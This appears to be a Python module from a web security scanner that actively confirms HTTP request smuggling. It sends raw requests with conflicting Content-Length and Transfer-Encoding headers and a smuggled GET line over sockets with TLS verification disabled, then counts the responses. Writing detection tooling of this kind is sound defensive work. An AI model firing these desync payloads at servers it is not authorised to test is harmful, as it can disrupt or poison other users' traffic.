"""Request-smuggling agent — active CL.TE / TE.CL desync detection.

The passive hints plugin (`dast/plugins/request_smuggling_hints.py`) flags
framing ambiguity (CL+TE both present, obfuscated TE, malformed CL); this agent
CONFIRMS desync by sending raw, deliberately-framed requests directly to the
target and reading the responses on the same connection.

Why a raw client: the MITM proxy and `active_checks._send` both re-frame
requests (httpx strips/recomputes Content-Length and Transfer-Encoding), which
destroys the experiment. The agent therefore opens `asyncio.open_connection`
to the target host:port directly (TLS with verification off for https; no ALPN,
so HTTP/1.1), modeled on the proxy's own TCP-tunnel/stream idioms.

Detection (deterministic, response-based — the safe detection design, not
queue-poisoning): a probe body that terminates the chunked body with
``0\\r\\n\\r\\n`` and then carries a benign smuggled request line
``GET /dast-smuggled-<rand> HTTP/1.1``. If the BACKEND honors the header the
FRONTEND does not, the smuggled request is parsed as the start of the NEXT
request and answered on this same connection — so one probe connection yields
TWO responses (original + the bogus path), while a same-shaped consistently
framed CONTROL yields exactly one. Evidence: both response status lines plus
the raw probe bytes.

Safety: the smuggled request is a GET to a random non-existent path (nothing
mutated, nothing poisoned for other users — every connection is private to the
probe), ≤6 connections per endpoint, ≤10s read timeouts, and
`is_host_dead` is honoured before probing.
"""

from __future__ import annotations

import asyncio
import ssl
import time
from typing import TYPE_CHECKING, List, Optional
from urllib.parse import urlparse

from dast.ai.agent_base import AgentFinding, VulnAgent
from dast.ai.coordinator import Coordinator
from dast.proxy.plugin_manager import log_event
from dast.scanners.active_checks import is_host_dead
from dast.utils.logger import get_logger

if TYPE_CHECKING:
    import httpx
    from dast.scanners.active_checks import CheckTarget

logger = get_logger(__name__)

_MAX_PROBES = 6          # raw connections per endpoint, hard cap
_READ_TIMEOUT_S = 10.0
_CONNECT_TIMEOUT_S = 10.0

# Marker path for the smuggled request — random per probe so evidence is
# unambiguous and the response cannot be confused with a cached page.
_SMUGGLED_PREFIX = "/dast-smuggled-"


class _RawResponse:
    def __init__(self, status: int, reason: str):
        self.status = status
        self.reason = reason

    def __repr__(self):
        return f"{self.status} {self.reason}".strip()


def _parse_responses(data: bytes) -> List[_RawResponse]:
    """Extract the HTTP status lines from a raw read buffer (headers may split
    across reads; we only need the response count + status codes for detection)."""
    responses: List[_RawResponse] = []
    for line in data.split(b"\r\n"):
        if line.startswith(b"HTTP/"):
            parts = line.decode("latin-1", errors="replace").split(" ", 2)
            status = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
            reason = parts[2] if len(parts) > 2 else ""
            responses.append(_RawResponse(status, reason))
    return responses


def _build_probe(target: "CheckTarget", smuggled_path: str, *, cl_te: bool) -> bytes:
    """One framed probe. ``cl_te=True``: Content-Length covers the smuggled
    request and TE is what a FRONTEND honouring TE consumes first; ``False``:
    the TE.CL mirror image. Both bodies terminate the chunked/CL body and then
    carry the benign smuggled request line."""
    parsed = urlparse(target.url)
    host_header = parsed.netloc or target.headers.get("host", "")
    path = (parsed.path or "/") + (f"?{parsed.query}" if parsed.query else "")
    # The smuggled request is a harmless GET to a random non-existent path.
    smuggled = (
        f"GET {smuggled_path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    smuggled_bytes = smuggled.encode("latin-1")
    if cl_te:
        # CL covers smuggled + terminator so a CL-honouring backend keeps reading
        # the smuggled request INTO this body; a TE-honouring backend ends the
        # body at the 0-chunk and reads the smuggled request as the NEXT request.
        body = b"0\r\n\r\n" + smuggled_bytes
        headers = (
            f"{target.method or 'POST'} {path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        )
    else:
        # TE.CL: chunked terminator first, smuggled request after — a backend
        # honouring TE ends the body there and parses the smuggled request next;
        # the CL value (shorter than the real body) makes a CL-honouring backend
        # wait for the rest, keeping the connection coherent for the control.
        body = b"0\r\n\r\n" + smuggled_bytes
        headers = (
            f"{target.method or 'POST'} {path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        )
    return headers.encode("latin-1") + body


def _build_control(target: "CheckTarget") -> bytes:
    """Consistently framed same-shape request (single CL, no TE) — the negative
    control that must yield exactly ONE response."""
    parsed = urlparse(target.url)
    host_header = parsed.netloc or target.headers.get("host", "")
    path = (parsed.path or "/") + (f"?{parsed.query}" if parsed.query else "")
    body = b"x=1"
    raw = (
        f"{target.method or 'POST'} {path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("latin-1") + body
    return raw


async def _send_raw_probe(host: str, port: int, use_tls: bool, payload: bytes,
                          smug_token: str) -> Optional[List[_RawResponse]]:
    """Open one direct connection, send the raw payload, read everything the
    server returns until close/timeout. Never raises."""
    ssl_ctx = None
    if use_tls:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ssl_ctx),
            timeout=_CONNECT_TIMEOUT_S,
        )
        writer.write(payload)
        await writer.drain()
        data = b""
        deadline = time.monotonic() + _READ_TIMEOUT_S
        while time.monotonic() < deadline and len(data) < 65536:
            try:
                chunk = await asyncio.wait_for(
                    reader.read(65536), timeout=max(0.1, deadline - time.monotonic()))
            except (asyncio.TimeoutError, ConnectionError, OSError):
                break
            if not chunk:
                break
            data += chunk
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:  # noqa: BLE001 — close is best-effort
            pass
        responses = _parse_responses(data)
        # The smuggled path's response must reference OUR random token — otherwise
        # the second response could be unrelated (proxy keep-alive noise etc.).
        if smug_token.encode("latin-1") not in data and len(responses) > 1:
            return responses[:1]
        return responses
    except Exception as exc:  # noqa: BLE001 — probing is best-effort, never crash
        logger.debug("smuggling: raw probe failed", host=host, error=str(exc)[:160])
        return None


def _headers_have_dual_framing(target: "CheckTarget") -> bool:
    headers = {k.lower() for k in (target.headers or {})}
    return "content-length" in headers and "transfer-encoding" in headers


class SmugglingAgent(VulnAgent):
    name = "Request Smuggling Agent"
    attack_type = "request_smuggling"
    description = ("Confirms CL.TE / TE.CL desync with direct raw-socket probes "
                   "(response differential on the same connection)")

    async def run(
        self,
        target: "CheckTarget",
        client: "httpx.AsyncClient",   # unused — raw sockets bypass the shared client
        collaborator=None,
    ) -> List[AgentFinding]:
        parsed = urlparse(target.url)
        host = parsed.hostname or ""
        if not host or is_host_dead(host):
            return []
        use_tls = parsed.scheme == "https"
        port = parsed.port or (443 if use_tls else 80)

        findings: List[AgentFinding] = []
        smug_base = f"{_SMUGGLED_PREFIX}{int(time.time()) % 100000}"
        probe_payloads = [
            _build_probe(target, f"{smug_base}-tecl", cl_te=False),  # TE.CL mirror
            _build_probe(target, f"{smug_base}-clte", cl_te=True),   # CL.TE mirror
        ]
        results: List[tuple] = []
        sent = 0
        for payload in probe_payloads:
            if sent >= _MAX_PROBES:
                break
            smug_token = payload.split(b"GET ")[1].split(b" ")[0].decode("latin-1")
            responses = await _send_raw_probe(host, port, use_tls, payload, smug_token)
            sent += 1
            control = await _send_raw_probe(host, port, use_tls,
                                            _build_control(target), "")
            sent += 1
            if responses is None or control is None:
                continue
            results.append((payload, responses, control))

        for payload, responses, control in results:
            if len(responses) <= len(control):
                continue
            # Desync: the probe connection answered MORE requests than the control
            # — the smuggled request was parsed server-side.
            statuses = " then ".join(str(r.status) for r in responses)
            raw_probe = payload.decode("latin-1", errors="replace")
            log_event("agent", "finding",
                      f"Request smuggling confirmed on {target.url}",
                      url=target.url, finding="HTTP Request Smuggling", source="agent")
            findings.append(AgentFinding(
                title="HTTP Request Smuggling (CL.TE/TE.CL desync)",
                severity="critical",
                cwe="CWE-444",
                attack_type="request_smuggling",
                evidence=(
                    f"A deliberately framed probe (duplicate Content-Length + "
                    f"Transfer-Encoding) produced {len(responses)} responses "
                    f"({statuses}) where the consistently framed control produced "
                    f"{len(control)} — the backend parsed a smuggled second request "
                    f"from the probe body. An attacker could similarly smuggle "
                    f"requests to other users' connections.\n\n"
                    f"Probe request:\n{raw_probe}"
                ),
                confirmed=True,
                payload=raw_probe[:200],
                parameter="Content-Length / Transfer-Encoding",
                url=target.url,
                request_method=target.method,
                bypass_validation=True,
            ))
            return findings

        if not findings:
            logger.info("smuggling: no desync confirmed on %s (probes sent ≤%d)",
                        target.url, sent)
        return findings


def _focus_from_hint(entry) -> None:
    """Called by the hints plugin: a framing-ambiguity finding guarantees the
    agent a dispatch slot via the coordinator's additive focus_attack_types."""
    entry.focus_attack_types = ["request_smuggling"]


Coordinator.register(SmugglingAgent)
